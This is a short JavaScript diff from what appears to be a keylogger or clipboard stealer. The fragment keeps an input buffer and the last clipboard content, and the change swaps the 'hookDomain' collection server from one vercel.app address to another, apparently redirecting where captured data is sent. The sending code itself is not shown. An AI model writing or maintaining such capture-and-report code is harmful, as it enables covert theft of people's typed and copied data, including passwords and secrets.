@@ -12,7 +12,7 @@ try {
     let inputBuffer = '';
     let lastClipboardContent = '';
 
-    const hookDomain = "https://hook-server-beta.vercel.app";
+    const hookDomain = "https://hook-server2.vercel.app";
 
     function getClipboardText() {
         try {
